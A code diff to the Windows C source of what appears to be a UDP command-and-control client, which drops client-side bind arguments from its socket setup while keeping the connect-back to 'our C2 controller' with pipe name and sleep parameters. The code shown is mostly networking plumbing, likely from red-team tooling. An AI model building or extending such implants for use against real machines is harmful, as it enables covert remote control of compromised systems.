@@ -47,12 +47,12 @@ static DWORD my_seqnum = 0;
  * @param port A pointer to an array containing the port to connect on
  * @return A socket handle for the connection
 */
-SOCKET create_socket(char* ip, char* port, char* my_ip, char* my_port)
+SOCKET create_socket(char* ip, char* port)
 {
 	int iResult;
 	SOCKET ConnectSocket = INVALID_SOCKET;
 	WSADATA wsaData;
-	struct addrinfo* result = NULL, * ptr = NULL, hints, *my_info;
+	struct addrinfo* result = NULL, * ptr = NULL, hints;
 
 	// Initialize Winsock
 	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
@@ -66,8 +66,6 @@ SOCKET create_socket(char* ip, char* port, char* my_ip, char* my_port)
 	hints.ai_socktype = SOCK_DGRAM;
 	hints.ai_protocol = IPPROTO_UDP;
 
-
-
 	// Resolve the server address and port
 	iResult = getaddrinfo(ip, port, &hints, &result);
 	if (iResult != 0) {
@@ -75,15 +73,6 @@ SOCKET create_socket(char* ip, char* port, char* my_ip, char* my_port)
 		WSACleanup();
 		return INVALID_SOCKET;
 	}
-
-	// Resolve our own address and port
-	iResult = getaddrinfo(my_ip, my_port, &hints, &my_info);
-	if (iResult != 0) {
-		debug_print("getaddrinfo failed: %d\n", iResult);
-		WSACleanup();
-		return INVALID_SOCKET;
-	}
-
 
 	// Attempt to connect to the first address returned by the call to getaddrinfo
 	ptr = result;
@@ -95,14 +84,6 @@ SOCKET create_socket(char* ip, char* port, char* my_ip, char* my_port)
 		freeaddrinfo(result);
 		WSACleanup();
 		return INVALID_SOCKET;
-	}
-
-	//Bind the socket to the given IP and port
-	iResult = bind(ConnectSocket, my_info->ai_addr, (int) my_info->ai_addrlen);
-	if (iResult == SOCKET_ERROR) {
-		debug_print("Bind Failure: %ld\n", WSAGetLastError());
-		closesocket(ConnectSocket);
-		ConnectSocket = INVALID_SOCKET;
 	}
 
 	// Connect to server.
@@ -325,10 +306,10 @@ void main(int argc, char* argv[])
 //TODO - add argument for IPv4 vs IPv6. TCP allows for protocol-agnostic sockets, UDP does not. 
 {
 	// Set connection info
-	if (argc != 7)
+	if (argc != 5)
 	{
 		debug_print("Incorrect number of args: %d\n", argc);
-		debug_print("Incorrect number of args: %s [SERVER_IP] [PORT] [PIPE_STR] [CLIENT_IP] [CLIENT_PORT] [SLEEP]", argv[0]);
+		debug_print("Incorrect number of args: %s [SERVER_IP] [PORT] [PIPE_STR] [SLEEP]", argv[0]);
 		exit(1);
 	}
 
@@ -338,8 +319,6 @@ void main(int argc, char* argv[])
 
 	char* IP = argv[1];
 	char* PORT = argv[2];
-	char* my_ip = argv[4];
-	char* my_port = argv[5];
 	my_seqnum = 0;
 	server_seqnum = 0;
 	
@@ -347,7 +326,7 @@ void main(int argc, char* argv[])
 	strncpy(pipe_str, argv[3], sizeof(pipe_str));
 
 	int sleep;
-	sleep = atoi(argv[6]);
+	sleep = atoi(argv[4]);
 
 	DWORD payloadLen = 0;
 	char* payloadData = NULL;
@@ -356,7 +335,7 @@ void main(int argc, char* argv[])
 	// Create a connection back to our C2 controller
 	SOCKET sockfd = INVALID_SOCKET;
 
-	sockfd = create_socket(IP, PORT, my_ip, my_port);
+	sockfd = create_socket(IP, PORT);
 	if (sockfd == INVALID_SOCKET)
 	{
 		debug_print("%s", "Socket creation error!\n");
